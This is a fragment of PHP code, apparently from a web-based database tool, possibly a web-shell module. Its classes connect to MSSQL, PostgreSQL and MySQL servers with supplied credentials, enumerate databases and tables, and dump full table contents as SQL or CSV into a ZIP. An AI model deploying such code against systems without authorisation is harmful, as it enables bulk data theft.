                    'SELECT name,TYPE_NAME(system_type_id),is_nullable FROM sys.all_columns WHERE ' . $r,
                    'SELECT name,TYPE_NAME(xtype),isnullable FROM syscolumns WHERE ' . $i,
                    'SELECT name,TYPE_NAME(system_type_id),is_nullable FROM sys.columns WHERE ' . $r
                ))) {
                    while ($v = $this->fetchRow()) {
                        $v[1] = strtoupper($v[1]);
                        if ($v[2] === 0)
                            $v[1] .= ' NOT NULL';
                        $a[$v[0]] = $v[1];
                    }
                    return $a;
                }
                if ($this->query('EXEC sp_columns_rowset ' . $td . ',' . $sd) && $v = $this->fetchRow()) {
                    do {
                        $v[11] = 'BINARY';
                        if ($v[10] === 0)
                            $v[11] .= ' NOT NULL';
                        if ($v[8] !== NULL)
                            $v[11] .= ' DEFAULT' . $v[8];
                        $a[$v[3]] = $v[11];
                    } while ($v = $this->fetchRow());
                    return $a;
                }
                return FALSE;
            }
        }
        class MSSQLClient extends MSSQLBase {
            function connect($h, $u, $p, $b, $c) {
                if (!($this->_cnct = mssql_connect($h, $u, $p)))
                    return FALSE;
                return $this->setBase($b);
            }
            function getError() {
                $v = mssql_get_last_message();
                if ($this->_cnct)
                    mssql_close($this->_cnct);
                return $v;
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = mssql_query($v, $this->_cnct))
                        return TRUE;
                return FALSE;
            }
            function fetchBase() {
                if (($v = mssql_fetch_row($this->_res)) || (mssql_next_result($this->_res) && ($v = mssql_fetch_row($this->_res))))
                    return $v[0];
                return FALSE;
            }
            function fetchSchema() {
                return ($v = mssql_fetch_row($this->_res)) ? $v[1] : FALSE;
            }
            function fetchTable() {
                if (($v = mssql_fetch_row($this->_res)) || (mssql_next_result($this->_res) && ($v = mssql_fetch_row($this->_res))))
                    return count($v) === 1 ? $v[0] : $v[2];
                return FALSE;
            }
            function getTableSize($b, $s, $t) {
                return ($v = mssql_query('SELECT COUNT(*) FROM ' . mssqlEscName($b, $s, $t), $this->_cnct)) ? mssql_result($v, 0, 0) : '"?"';
            }
            function setBase($v) {
                if ($v !== $this->_base) {
                    $this->_base = NULL;
                    if (!mssql_select_db(mssqlEscName($v), $this->_cnct) && !mssql_query('USE ' . mssqlEscName($v), $this->_cnct))
                        return FALSE;
                    $this->_base = $v;
                }
                return TRUE;
            }
            function getColumns($b, $s, $t) {
                if ($a = parent::getColumns($b, $s, $t))
                    return $a;
                $a = array();
                if ($q = mssql_query('SELECT TOP 1 * FROM ' . mssqlEscName($b, $s, $t), $this->_cnct)) {
                    if ($v = mssql_fetch_field($q)) {
                        do {
                            $a[$v->name] = strtoupper($v->type);
                        } while ($v = mssql_fetch_field($q));
                        return $a;
                    }
                    if (is_string($v = mssql_field_name($q, 0))) {
                        $i = 0;
                        do {
                            $a[$v] = is_string($s = mssql_field_type($q, $i)) ? strtoupper($s) : '';
                        } while (is_string($v = mssql_field_name($q, ++$i)));
                        return $a;
                    }
                    if ($v = mssql_fetch_array($q, MSSQL_ASSOC)) {
                        foreach ($v as $k => $i)
                            $a[$k] = '';
                        return $a;
                    }
                }
                return FALSE;
            }
            function select($b, $s, $t, $c, $o, $l) {
                $v = $l < 1000 ? 1000 : $l;
                if (!($this->_res = mssql_query('SELECT TOP ' . ($o + $l) . ' ' . sqlJoinColumns($c, 'mssqlEscName') . ' FROM ' . mssqlEscName($b, $s, $t), $this->_cnct, $v)))
                    return FALSE;
                $k = floor($o / $v);
                for ($i = 0; $i < $k; ++$i)
                    if (!mssql_fetch_batch($this->_res))
                        return FALSE;
                $k = $o - ($k * $v);
                if ($k > 0 && !mssql_data_seek($this->_res, $k))
                    return FALSE;
                return TRUE;
            }
            function fetchAssoc() {
                return mssql_fetch_array($this->_res, MSSQL_ASSOC);
            }
            function fetchRow() {
                if (($v = mssql_fetch_row($this->_res)) || (mssql_fetch_batch($this->_res) && ($v = mssql_fetch_row($this->_res))))
                    return $v;
                return FALSE;
            }
            function nextResult() {
                return mssql_next_result($this->_res);
            }
            function query($v) {
                return ($this->_res = mssql_query($v, $this->_cnct));
            }
            function dump($b, $s, $t, $c, $f) {
                if (!$this->setBase($b))
                    return sprintf(E_CHNGDB, $b, $s, $t);
                $i = '';
                if ($f) {
                    if ($v = $this->getColumns($b, $s, $t))
                        sqlOutCreate($t, $v, 'BINARY', 'mssqlEscName');
                    else
                        $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
                }
                $c = sqlJoinColumns($c, 'mssqlEscName');
                if (($q = mssql_query('SELECT ' . $c . ' FROM ' . mssqlEscName($b, $s, $t), $this->_cnct, 1000)) && ($v = mssql_fetch_array($q, MSSQL_ASSOC))) {
                    if ($f)
                        sqlOutInsert(mssqlEscName($t), $c);
                    else
                        echo implode(';', array_keys($v)), "\n";
                    $d = FALSE;
                    do {
                        do {
                            if ($d)
                                echo $d;
                            else
                                $d = $f ? ',' : "\n";
                            if ($f)
                                sqlOutValues($v, 'mssqlEscData');
                            else
                                csvOutValues($v);
                        } while ($v = mssql_fetch_row($q));
                    } while (mssql_fetch_batch($q));
                    if ($f)
                        echo ";\n";
                    mssql_free_result($q);
                } else
                    $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
                return $i;
            }
            function close() {
                mssql_close($this->_cnct);
            }
        }
        class SQLSrvClient extends MSSQLBase {
            function connect($h, $u, $p, $b, $c) {
                $this->_base = $b;
                $a           = array();
                if ($u !== NULL)
                    $a['UID'] = $u;
                if ($p !== NULL)
                    $a['PWD'] = $p;
                if ($b !== NULL)
                    $a['Database'] = $b;
                return ($this->_cnct = sqlsrv_connect($h, $a));
            }
            function getError() {
                $v = sqlsrv_errors();
                if ($this->_cnct)
                    sqlsrv_close($this->_cnct);
                return $v ? $v[0]['message'] : '';
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = sqlsrv_query($this->_cnct, $v))
                        return TRUE;
                return FALSE;
            }
            function fetchBase() {
                return (($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)) || (sqlsrv_next_result($this->_res) && ($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)))) ? $v[0] : FALSE;
            }
            function fetchSchema() {
                return ($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)) ? $v[1] : FALSE;
            }
            function fetchTable() {
                if (($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)) || (sqlsrv_next_result($this->_res) && ($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC))))
                    return count($v) === 1 ? $v[0] : $v[2];
                return FALSE;
            }
            function getTableSize($b, $s, $t) {
                return (($v = sqlsrv_query($this->_cnct, 'SELECT COUNT(*) FROM ' . mssqlEscName($b, $s, $t))) && ($v = sqlsrv_fetch_array($v, SQLSRV_FETCH_NUMERIC))) ? $v[0] : '"?"';
            }
            function getColumns($b, $s, $t) {
                if ($a = parent::getColumns($b, $s, $t))
                    return $a;
                $a = array();
                if ($q = sqlsrv_query($this->_cnct, 'SELECT TOP 1 * FROM ' . mssqlEscName($b, $s, $t))) {
                    if ($v = sqlsrv_field_metadata($q)) {
                        $y = array(
                            1 => 'CHAR',
                            2 => 'NUMERIC',
                            3 => 'DECIMAL',
                            4 => 'INT',
                            5 => 'SMALLINT',
                            6 => 'FLOAT',
                            7 => 'REAL',
                            12 => 'VARCHAR',
                            91 => 'DATE',
                            93 => 'DATETIME',
                            -1 => 'TEXT',
                            -2 => 'BINARY',
                            -3 => 'VARBINARY',
                            -4 => 'IMAGE',
                            -5 => 'BIGINT',
                            -6 => 'TINYINT',
                            -7 => 'BIT',
                            -8 => 'NCHAR',
                            -9 => 'NVARCHAR',
                            -10 => 'NTEXT',
                            -11 => 'UNIQUEIDENTIFIER',
                            -151 => 'UDT',
                            -152 => 'XML',
                            -154 => 'TIME',
                            -155 => 'DATETIMEOFFSET'
                        );
                        foreach ($v as $i) {
                            $i['Type'] = isset($y['Type']) ? $y['Type'] : 'BINARY';
                            if ($i['Nullable'] === SQLSRV_NULLABLE_NO)
                                $i['Type'] .= ' NOT NULL';
                            $a[$i['Name']] = $i['Type'];
                        }
                        return $a;
                    }
                    if ($v = sqlsrv_fetch_array($q, SQLSRV_FETCH_ASSOC)) {
                        foreach ($v as $k => $i)
                            $a[$k] = '';
                        return $a;
                    }
                }
                return FALSE;
            }
            function select($b, $s, $t, $c, $o, $l) {
                return (($this->_res = sqlsrv_query($this->_cnct, 'SELECT TOP ' . ($o + $l) . ' ' . sqlJoinColumns($c, 'mssqlEscName') . ' FROM ' . mssqlEscName($b, $s, $t), array(), array(
                    'Scrollable' => SQLSRV_CURSOR_DYNAMIC
                ))) && sqlsrv_fetch($this->_res, SQLSRV_SCROLL_ABSOLUTE, $o));
            }
            function fetchAssoc() {
                return sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_ASSOC);
            }
            function fetchRow() {
                return sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC);
            }
            function nextResult() {
                return sqlsrv_next_result($this->_res);
            }
            function query($v) {
                return ($this->_res = sqlsrv_query($this->_cnct, $v));
            }
            function setBase($v) {
                if ($v !== $this->_base) {
                    $this->_base = NULL;
                    if (!sqlsrv_query($this->_cnct, 'USE ' . mssqlEscName($b)))
                        return FALSE;
                    $this->_base = $v;
                }
                return TRUE;
            }
            function dump($b, $s, $t, $c, $f) {
                if (!$this->setBase($b))
                    return sprintf(E_CHNGDB, $b, $s, $t);
                $i = '';
                if ($f) {
                    if ($v = $this->getColumns($b, $s, $t))
                        sqlOutCreate($t, $v, 'BINARY', 'mssqlEscName');
                    else
                        $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
                }
                $c = sqlJoinColumns($c, 'mssqlEscName');
                if (($q = sqlsrv_query($this->_cnct, 'SELECT ' . $c . ' FROM ' . mssqlEscName($b, $s, $t))) && ($v = sqlsrv_fetch_array($q, SQLSRV_FETCH_ASSOC))) {
                    if ($f)
                        sqlOutInsert(mssqlEscName($t), $c);
                    else
                        echo implode(';', array_keys($v)), "\n";
                    $d = FALSE;
                    do {
                        if ($d)
                            echo $d;
                        else
                            $d = $f ? ',' : "\n";
                        if ($f)
                            sqlOutValues($v, 'mssqlEscData');
                        else
                            csvOutValues($v);
                    } while ($v = sqlsrv_fetch_array($q, SQLSRV_FETCH_NUMERIC));
                    if ($f)
                        echo ";\n";
                    sqlsrv_free_stmt($q);
                } else
                    $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
                return $i;
            }
            function close() {
                sqlsrv_close($this->_cnct);
            }
        }
        function pgsqlEscData($v) {
            return "'" . str_replace(array(
                '\\',
                "'"
            ), array(
                '\\\\',
                "''"
            ), $v) . "'";
        }
        function pgsqlEscName() {
            $a = func_get_args();
            foreach ($a as $k => $v)
                $a[$k] = '"' . str_replace('"', '""', $v) . '"';
            return implode('.', $a);
        }
        class PGSQLBase extends SQLBase {
            var $haveSchemas = TRUE, $canPaginate = FALSE, $_params = '', $_base = NULL, $_clcs = NULL;
            function fillParams($h, $u, $p) {
                $v = array();
                if ($h !== NULL) {
                    if ($i = strrpos($h, ':')) {
                        $v[] = 'host=' . $this->escParam(substr($h, 0, $i));
                        $v[] = 'port=' . substr($h, $i + 1);
                    } else
                        $v[] = 'host=' . $this->escParam($h);
                }
                if ($u !== NULL)
                    $v[] = 'user=' . $this->escParam($u);
                if ($p !== NULL)
                    $v[] = 'password=' . $this->escParam($p);
                $this->_params = implode(' ', $v);
            }
            function charset($k) {
                $v = array(
                    'UTF8',
                    'UTF8',
                    'WIN1250',
                    'WIN1251',
                    'WIN1252',
                    'WIN1254',
                    'WIN1256',
                    'WIN1257',
                    'LATIN1',
                    'LATIN2',
                    'ISO_8859_7',
                    'ISO_8859_8',
                    'LATIN5',
                    'LATIN7',
                    'BIG5',
                    'GBK',
                    'SJIS',
                    'EUC_KR',
                    'EUC_JP',
                    'WIN866',
                    'KOI8R',
                    'KOI8U'
                );
                return isset($v[$k]) ? $v[$k] : 'utf8';
            }
            function escParam($v) {
                return "'" . addcslashes($v, "'\\") . "'";
            }
            function getBases() {
                return $this->tryQueries(array(
                    'SELECT datname FROM pg_catalog.pg_database WHERE NOT datistemplate',
                    'SELECT datname FROM pg_catalog.pg_stat_database',
                    'SELECT datname FROM pg_catalog.pg_stat_database_conflicts',
                    'SELECT current_database()'
                ));
            }
            function getSchemas($b) {
                if (!$this->setBase($b))
                    return FALSE;
                return $this->tryQueries(array(
                    'SELECT schema_name FROM information_schema.schemata',
                    'SELECT nspname FROM pg_catalog.pg_namespace',
                    'SELECT DISTINCT table_schema FROM information_schema.tables',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_tables',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_xact_all_tables',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_statio_all_tables',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_user_tables UNION SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_sys_tables',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_xact_user_tables UNION SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_xact_sys_tables',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_statio_user_tables UNION SELECT DISTINCT schemaname FROM pg_catalog.pg_statio_sys_tables',
                    'SELECT DISTINCT table_schema FROM information_schema.columns',
                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stats'
                ));
            }
            function getTables($b, $s) {
                if (!$this->setBase($b))
                    return FALSE;
                $s = pgsqlEscData($s);
                return $this->tryQueries(array(
                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $s,
                    'SELECT relname FROM pg_catalog.pg_stat_all_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_statio_all_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_stat_xact_all_tables WHERE schemaname=' . $s,
                    'SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_stat_sys_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_stat_user_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_statio_sys_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_statio_user_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_stat_xact_sys_tables WHERE schemaname=' . $s,
                    'SELECT relname FROM pg_catalog.pg_stat_xact_user_tables WHERE schemaname=' . $s
                ));
            }
            function getColumns($b, $s, $t) {
                $a = array();
                if ($this->tryQueries(array(
                    'SELECT column_name,udt_name,is_nullable,column_default FROM information_schema.columns WHERE table_name=' . pgsqlEscData($t) . ' AND table_schema=' . pgsqlEscData($s),
                    'SELECT a.attname, FORMAT_TYPE(a.atttypid,a.atttypmod), a.attnotnull, d.adsrc FROM pg_attribute a LEFT JOIN pg_attrdef d ON d.adrelid=a.attrelid AND d.adnum=a.attnum WHERE attrelid = ' . pgsqlEscData(pgsqlEscName($s, $t)) . '::regclass AND attnum>0 AND NOT attisdropped'
                ))) {
                    while ($v = $this->fetchRow()) {
                        $v[1] = strtoupper($v[1]);
                        if ($v[2][0] === 'N' || $v[2][0] === 'f')
                            $v[1] .= ' NOT NULL';
                        if ($v[3] !== NULL)
                            $v[1] .= ' DEFAULT ' . pgsqlEscData($v[3]);
                        $a[$v[0]] = $v[1];
                    }
                    return $a;
                }
                return FALSE;
            }
            function select($b, $s, $t, $c, $o, $l) {
                return $this->query('SELECT ' . sqlJoinColumns($c, 'pgsqlEscName') . ' FROM ' . pgsqlEscName($s, $t) . ' LIMIT ' . $l);
            }
        }
        class PGSQLClient extends PGSQLBase {
            function connect($h, $u, $p, $b, $c) {
                $this->_base = $b;
                $this->_clcs = $c;
                $this->fillParams($h, $u, $p);
                $v = $this->_params;
                if ($b !== NULL)
                    $v .= ' dbname=' . $this->escParam($b);
                $this->_cnct = pg_connect($v);
                if (!$this->_cnct && $b === NULL)
                    $this->_cnct = pg_connect($this->_params . ' dbname=template1');
                if (!$this->_cnct)
                    return FALSE;
                pg_exec($this->_cnct, "SET CLIENT_ENCODING TO '" . $this->charset($c) . "'");
                return TRUE;
            }
            function getError() {
                if ($this->_cnct) {
                    $v = (PHP_VERSION >= '4.2') ? pg_last_error($this->_cnct) : pg_errormessage($this->_cnct);
                    pg_close($this->_cnct);
                    return $v;
                }
                return '';
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = pg_exec($this->_cnct, $v))
                        return TRUE;
                return FALSE;
            }
            function fetchBase() {
                return ($v = pg_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function setBase($v) {
                if ($v !== $this->_base) {
                    $this->_base = NULL;
                    pg_close($this->_cnct);
                    if (!($this->_cnct = pg_connect($this->_params . ' dbname=' . $this->escParam($v))))
                        return FALSE;
                    $this->_base = $v;
                    pg_exec($this->_cnct, "SET CLIENT_ENCODING TO '" . $this->charset($this->_clcs) . "'");
                }
                return TRUE;
            }
            function fetchSchema() {
                return ($v = pg_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function fetchTable() {
                return ($v = pg_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function getTableSize($b, $s, $t) {
                if (($v = pg_exec($this->_cnct, 'SELECT COUNT(*) FROM ' . pgsqlEscName($s, $t)))) {
                    $v = pg_fetch_row($v);
                    return $v[0];
                }
                return '"?"';
            }
            function getColumns($b, $s, $t) {
                $a = parent::getColumns($b, $s, $t);
                if ($a)
                    return $a;
                $a = array();
                if (PHP_VERSION >= '4.3' && ($v = pg_meta_data($this->_cnct, $s . '.' . $t))) {
                    foreach ($v as $k => $i) {
                        $a[$k] = strtoupper($i['type']);
                        if ($i['not null'])
                            $a[$k] .= ' NOT NULL';
                    }
                    return $a;
                }
                if (PHP_VERSION >= '4.2' && ($q = pg_exec($this->_cnct, 'SELECT * FROM ' . pgsqlEscName($s, $t) . ' LIMIT 0'))) {
                    $i = 0;
                    while (($v = pg_field_name($q, $i)) !== FALSE)
                        $a[$k] = pg_field_type($q, $i++);
                    return $a;
                }
                if (($v = pg_exec($this->_cnct, 'SELECT * FROM ' . pgsqlEscName($s, $t) . ' LIMIT 1')) && ($v = pg_fetch_array($this->_res, NULL, PGSQL_ASSOC))) {
                    foreach ($v as $k)
                        $a[$k] = '';
                    return $a;
                }
                return FALSE;
            }
            function query($v) {
                return ($this->_res = pg_exec($this->_cnct, $v));
            }
            function fetchAssoc() {
                return pg_fetch_array($this->_res, NULL, PGSQL_ASSOC);
            }
            function fetchRow() {
                return pg_fetch_row($this->_res);
            }
            function dump($b, $s, $t, $c, $f) {
                if (!$this->setBase($b))
                    return sprintf(E_CHNGDB, $b, $s, $t);
                $i = '';
                if ($f) {
                    if ($v = $this->getColumns($b, $s, $t))
                        sqlOutCreate($t, $v, 'BINARY', 'pgsqlEscName');
                    else
                        $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
                }
                $c = sqlJoinColumns($c, 'pgsqlEscName');
                if (pg_exec($this->_cnct, 'BEGIN; DECLARE c CURSOR FOR SELECT ' . $c . ' FROM ' . pgsqlEscName($s, $t))) {
                    if (($v = pg_exec($this->_cnct, 'FETCH NEXT FROM c')) && ($v = pg_fetch_array($v, NULL, PGSQL_ASSOC))) {
                        if ($f)
                            sqlOutInsert(pgsqlEscName($t), $c);
                        else
                            echo implode(';', array_keys($v)), "\n";
                        $c = $this->_cnct;
                        $d = FALSE;
                        do {
                            if ($d)
                                echo $d;
                            else
                                $d = $f ? ',' : "\n";
                            if ($f)
                                sqlOutValues($v, 'pgsqlEscData');
                            else
                                csvOutValues($v);
                        } while (($v = pg_exec($c, 'FETCH NEXT FROM c')) && ($v = pg_fetch_row($v)));
                        if ($f)
                            echo ";\n";
                    }
                    pg_exec('CLOSE c; ROLLBACK');
                } else
                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
                return $i;
            }
            function close() {
                pg_close($this->_cnct);
            }
        }
        if (PHP_VERSION >= '5'):
            class MySQLPDOClient extends MySQLBase {
                function connect($h, $u, $p, $b, $c) {
                    $a = array();
                    if ($h !== NULL && ($v = strrpos($h, ':'))) {
                        $t = (int) substr($h, $v + 1);
                        $h = substr($h, 0, $v);
                    } else
                        $t = NULL;
                    if ($h !== NULL)
                        $a[] = 'host=' . $h;
                    if ($t !== NULL)
                        $a[] = 'port=' . $t;
                    if ($b !== NULL)
                        $a[] = 'dbname=' . $b;
                    try {
                        $v = new PDO('mysql:' . implode(';', $a), $u, $p);
                    }
                    catch (Exception $e) {
                        $this->connError($e->getMessage(), $h, $u, $p, $b);
                    }
                    $v->query('SET NAMES ' . $this->charset($c));
                    $this->_cnct = $v;
                    return TRUE;
                }
                function getTableSize($b, $t) {
                    return $this->sqlTableSize(mysqlEscName($b, $t));
                }
                function getColumns($b, $t) {
                    if ($a = parent::getColumns($b, $t))
                        return $a;
                    return $this->getColumnsNames(mysqlEscName($b, $t));
                }
                
                /*FIX*/
				function fetchRow() {
					$r = $this->_res->fetch(PDO::FETCH_NUM);
					if(defined('MPDFIX') && is_int(MPDFIX)) $this->_res->closeCursor();
					return $r;
				}
                
                function dump($b, $t, $c, $f) {
					define('MPDFIX', 1);
					
                    if ($f)
                        $i = $this->outCreateTable($b, $t);
                    $c = sqlJoinColumns($c, 'mysqlEscName');
                    $this->_cnct->setAttribute(PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, FALSE);
                    if (($q = $this->_cnct->query('SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t))) && ($v = $q->fetch(PDO::FETCH_ASSOC))) {
                        if ($f)
                            sqlOutInsert(mysqlEscName($t), $c);
                        else
                            echo implode(';', array_keys($v)), "\n";
                        $d = FALSE;
                        do {
                            if ($d)
                                echo $d;
                            else
                                $d = $f ? ',' : "\n";
                            if ($f)
                                sqlOutValues($v, 'mysqlEscData');
                            else
                                csvOutValues($v);
                        } while ($v = $q->fetch(PDO::FETCH_NUM));
                        if ($f)
                            echo ";\n";
                    } else
                        $i .= sprintf(E_SLCTDT, $b . '.' . $t . ' '. print_r($this->_cnct->errorInfo(), true));
                    return $i;
                }
            }
            class MSSQLPDOClient extends MSSQLBase {
                var $canPaginate = FALSE;
                function connect($d, $u, $p, $b, $c) {
                    try {
                        $v = new PDO($d, $u, $p);
                    }
                    catch (Exception $e) {
                        $this->connError($e->getMessage(), $d, $u, $p, $b);
                    }
                    $this->_cnct = $v;
                    $this->_base = $b;
                    return TRUE;
                }
                function getTableSize($b, $s, $t) {
                    return $this->sqlTableSize(mssqlEscName($b, $s, $t));
                }
                function setBase($v) {
                    if ($v !== $this->_base) {
                        $this->_base = NULL;
                        if (!$this->_cnct->query('USE ' . mssqlEscName($v)))
                            return FALSE;
                        $this->_base = $v;
                    }
                    return TRUE;
                }
                function getColumns($b, $s, $t) {
                    if ($a = parent::getColumns($b, $s, $t))
                        return $a;
                    return $this->getColumnsNames(mssqlEscName($b, $s, $t));
                }
                function select($b, $s, $t, $c, $o, $l) {
                    return $this->query('SELECT TOP ' . $l . ' ' . sqlJoinColumns($c, 'mssqlEscName') . ' FROM ' . mssqlEscName($s, $t));
                }
                function dump($b, $s, $t, $c, $f) {
                    if (!$this->setBase($b))
                        return sprintf(E_CHNGDB, $b, $s, $t);
                    $i = '';
                    if ($f) {
                        if ($v = $this->getColumns($b, $s, $t))
                            sqlOutCreate($t, $v, 'BINARY', 'mssqlEscName');
                        else
                            $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
                    }
                    $c = sqlJoinColumns($c, 'mssqlEscName');
                    if (($q = $this->_cnct->query('SELECT ' . $c . ' FROM ' . mssqlEscName($s, $t))) && ($v = $q->fetch(PDO::FETCH_ASSOC))) {
                        if ($f)
                            sqlOutInsert(mssqlEscName($t), $c);
                        else
                            echo implode(';', array_keys($v)), "\n";
                        $d = FALSE;
                        do {
                            if ($d)
                                echo $d;
                            else
                                $d = $f ? ',' : "\n";
                            if ($f)
                                sqlOutValues($v, 'mssqlEscData');
                            else
                                csvOutValues($v);
                        } while ($v = $q->fetch(PDO::FETCH_NUM));
                        if ($f)
                            echo ";\n";
                    } else
                        $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
                    return $i;
                }
                function fetchBase() {
                    if (($v = $this->_res->fetch(PDO::FETCH_NUM)) || ($this->_res->nextRowset() && ($v = $this->_res->fetch(PDO::FETCH_NUM))))
                        return $v[0];
                    return FALSE;
                }
                function fetchSchema() {
                    return $this->_res->fetchColumn(1);
                }
                function fetchTable() {
                    if (($v = $this->_res->fetch(PDO::FETCH_NUM)) || ($this->_res->nextRowset() && ($v = $this->_res->fetch(PDO::FETCH_NUM))))
                        return count($v) === 1 ? $v[0] : $v[2];
                    return FALSE;
                }
                function nextResult() {
                    return $this->_res->nextRowset();
                }
            }
            class MSSQLDBLIBClient extends MSSQLPDOClient {
                function connect($h, $u, $p, $b, $c) {
                    $a = array();
                    if ($h !== NULL)
                        $a[] = 'host=' . $h;
                    if ($b !== NULL)
                        $a[] = 'dbname=' . $b;
                    return parent::connect('mssql:' . implode(';', $a), $h, $u, $p, $b, $c);
                }
            }
            class MSSQLODBCClient extends MSSQLPDOClient {
                function connect($h, $u, $p, $b, $c) {
                    $a = array();
                    if ($h !== NULL)
                        $a[] = 'Server=' . $h;
                    if ($b !== NULL)
                        $a[] = 'Database=' . $b;
                    return parent::connect('odbc:' . implode(';', $a), $h, $u, $p, $b, $c);
                }
            }
            class SQLSrvPDOClient extends MSSQLPDOClient {
                function connect($h, $u, $p, $b, $c) {
                    $a = array();
                    if ($h !== NULL)
                        $a[] = 'Server=' . $h;
                    if ($b !== NULL)
                        $a[] = 'Database=' . $b;
                    return parent::connect('sqlsrv:' . implode(';', $a), $u, $p, $b, $c);
                }
            }
            class PGSQLPDOClient extends PGSQLBase {
                function connect($h, $u, $p, $b, $c) {
                    $this->_base = $b;
                    $this->_clcs = $c;
                    $this->fillParams($h, $u, $p);
                    $this->_params = 'pgsql:' . $this->_params;
                    $v             = $this->_params;
                    if ($b !== NULL)
                        $v .= ' base=' . $this->escParam($b);
                    try {
                        $v = new PDO($v);
                    }
                    catch (Exception $e) {
                        $this->connError($e->getMessage(), $h, $u, $p, $b);
                    }
                    $v->query("SET CLIENT_ENCODING TO '" . $this->charset($c) . "'");
                    $this->_cnct = $v;
                    return TRUE;
                }
                function setBase($v) {
                    if ($v !== $this->_base) {
                        $this->_res  = NULL;
                        $this->_cnct = NULL;
                        $this->_base = NULL;
                        try {
                            $v = new PDO($this->_params . ' base=' . $this->escParam($v));
                        }
                        catch (Exception $e) {
                            return FALSE;
                        }
                        $this->_base = $v;
                        $v->query("SET CLIENT_ENCODING TO '" . $this->charset($this->_clcs) . "'");
                        $this->_cnct = $v;
                    }
                    return TRUE;
                }
                function getTableSize($b, $s, $t) {
                    return $this->sqlTableSize(pgsqlEscName($s, $t));
                }
                function getColumns($b, $s, $t) {
                    if ($a = parent::getColumns($b, $s, $t))
                        return $a;
                    return $this->getColumnsNames(pgsqlEscName($s, $t));
                }
                function dump($b, $s, $t, $c, $f) {
                    if (!$this->setBase($b))
                        return sprintf(E_CHNGDB, $b, $s, $t);
                    $i = '';
                    if ($f) {
                        if ($v = $this->getColumns($b, $s, $t))
                            sqlOutCreate($t, $v, 'BINARY', 'pgsqlEscName');
                        else
                            $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
                    }
                    $c = sqlJoinColumns($c, 'pgsqlEscName');
                    if ($this->_cnct->query('BEGIN; DECLARE c CURSOR FOR SELECT ' . $c . ' FROM ' . pgsqlEscName($s, $t))) {
                        if (($v = $this->_cnct->query('FETCH NEXT FROM c')) && ($v = $v->fetch(PDO::FETCH_ASSOC))) {
                            if ($f)
                                sqlOutInsert(pgsqlEscName($t), $c);
                            else
                                echo implode(';', array_keys($v)), "\n";
                            $c = $this->_cnct;
                            $d = FALSE;
                            do {
                                if ($d)
                                    echo $d;
                                else
                                    $d = $f ? ',' : "\n";
                                if ($f)
                                    sqlOutValues($v, 'pgsqlEscData');
                                else
                                    csvOutValues($v);
                            } while (($v = $c->query('FETCH NEXT FROM c')) && ($v = $v->fetch(PDO::FETCH_NUM)));
                            if ($f)
                                echo ";\n";
                        }
                        $this->_cnct->query('CLOSE c; ROLLBACK');
                    } else
                        $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
                    return $i;
                }
                function fetchSchema() {
                    return $this->_res->fetchColumn(0);
                }
            }
        endif;
        function outData(&$S) {
            echo ',"f":[';
            if ($v = $S->fetchAssoc()) {
                $b = FALSE;
                foreach ($v as $k => $i) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    jsonEcho($k);
                }
                echo '],"r":[';
                $b = FALSE;
                do {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    echo '[';
                    $k = FALSE;
                    foreach ($v as $i) {
                        if ($k)
                            echo ',';
                        else
                            $k = TRUE;
                        jsonEcho($i);
                    }
                    echo ']';
                } while ($v = $S->fetchRow());
            }
            echo ']';
        }
        $S = $D['e'] . 'Client';
        $S = new $S();
        if (!$S->connect($D['h'], $D['u'], $D['p'], $D['b'], $D['l']))
            $S->connError($S->getError(), $D['h'], $D['u'], $D['p'], $D['b']);
        if (isset($D['d'])) {
            $Z = new PZIP();
            $Z->init();
            $a = array();
            $m = packTime(time());
            foreach ($D['d'] as $k => $v) {
                if (isset($D['s'][$k]))
                    foreach ($D['s'][$k] as $i => $s) {
                        if (isset($D['t'][$k . '-' . $i]))
                            foreach ($D['t'][$k . '-' . $i] as $n => $t)
